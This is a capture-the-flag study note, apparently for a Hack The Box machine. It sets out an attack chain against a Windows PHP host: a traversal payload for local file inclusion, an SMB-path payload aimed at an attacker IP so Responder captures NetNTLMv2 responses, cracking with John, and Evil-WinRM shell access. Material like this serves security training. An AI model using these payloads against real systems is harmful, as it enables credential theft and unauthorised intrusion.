# LFI + NTLM Hash Capture Attack Chain

**Category:** Attack Techniques / Windows  
**Key Concepts:** LFI, NetNTLMv2, Responder, Hash Cracking, WinRM  
**Difficulty:** Easy  

---

## When To Use This Chain

- Windows target with a web app that takes a filename or path as a URL parameter
- WinRM (port 5985) open — means you can get a shell with valid credentials
- PHP backend (look for `X-Powered-By: PHP` header)

---

## Recon Signals

```bash
nmap -p- --min-rate 1000 -sV TARGET
```

Look for:
- Port 80 with PHP — potential LFI target
- Port 5985 (WinRM) — remote shell if you get credentials
- TTL 127 in nmap output — confirms Windows

---

## Virtual Host Setup

If the page redirects to a `.htb` hostname that won't load:

```bash
echo "TARGET_IP hostname.htb" | sudo tee -a /etc/hosts
```

Remove when done:
```bash
sudo nano /etc/hosts
```

---

## File Inclusion Vulnerability (LFI)

LFI occurs when a web app uses user input to include files without sanitizing the path. The `../` string traverses up one directory at a time.

**Find the vulnerable parameter:** Look for URL parameters that load pages or files:
```
http://TARGET/index.php?page=english.html
http://TARGET/index.php?lang=fr
```

**Test for LFI** by trying to read a known Windows file:
```
http://TARGET/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

If the hosts file contents appear in the page — LFI confirmed.

**Why it works:** PHP's `include()` function loads whatever path you give it. Without sanitization, `../` sequences traverse the filesystem freely.

---

## NTLM Hash Capture with Responder

**The trick:** PHP's `include()` will load SMB URLs even when remote HTTP/FTP is disabled. Point it at your machine running Responder — Windows tries to authenticate via SMB and leaks the NetNTLMv2 hash.

**Step 1 — Start Responder on your VPN interface:**
```bash
sudo responder -I tun0 -v
```

**Step 2 — Trigger authentication via LFI:**
```
http://TARGET/?page=//YOUR_KALI_IP/somefile
```

Windows tries to load `\\YOUR_KALI_IP\somefile` via SMB, authenticates with the user's NTLM credentials, and Responder captures the NetNTLMv2 hash.

**Step 3 — Copy the hash from Responder output.**

---

## NTLM Terminology (Important — People Confuse These)

| Term | What It Actually Is |
|---|---|
| NTHash | Password hash stored in Windows SAM database |
| NetNTLMv2 | Challenge/response string used for network authentication — NOT a hash but attacked like one |
| NTLM | The authentication protocol overall |

What Responder captures is **NetNTLMv2** — not the actual password hash. You can't pass it directly but you can crack it offline.

---

## Hash Cracking with John the Ripper

```bash
# Save hash to file
echo "FULL_HASH_STRING" > hash.txt

# Crack it
john -w=/usr/share/wordlists/rockyou.txt hash.txt

# If already cracked, show results
john --show hash.txt
```

John automatically identifies the hash type. For NetNTLMv2 it tests each password from rockyou by encrypting the challenge with that password and comparing to the captured response.

---

## Remote Access with Evil-WinRM

Once you have credentials, use Evil-WinRM to get a PowerShell shell via WinRM (port 5985):

```bash
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
```

**Navigate to the flag:**
```powershell
cd C:\Users\
ls
cd USERNAME\Desktop
type flag.txt
```

---

## Full Attack Chain Summary

```
1. nmap          → find port 80 (PHP) + port 5985 (WinRM)
2. /etc/hosts    → add virtual host if page redirects to hostname
3. Browse site   → find URL parameter that loads pages (?page=)
4. Test LFI      → ../../../../windows/system32/drivers/etc/hosts
5. Responder     → sudo responder -I tun0 -v
6. Trigger auth  → ?page=//YOUR_IP/somefile
7. Capture hash  → copy NetNTLMv2 from Responder output
8. Crack hash    → john -w=/usr/share/wordlists/rockyou.txt hash.txt
9. Evil-WinRM    → evil-winrm -i TARGET -u admin -p PASSWORD
10. Get flag     → C:\Users\USERNAME\Desktop\flag.txt
```

---

## Key Takeaways

- LFI + Windows + SMB = NTLM hash capture without any CVE
- PHP includes SMB URLs by default even with remote file inclusion disabled
- NetNTLMv2 can't be used directly but cracks quickly against rockyou
- WinRM on port 5985 = PowerShell shell if you have credentials
- TTL 127 in nmap = Windows target
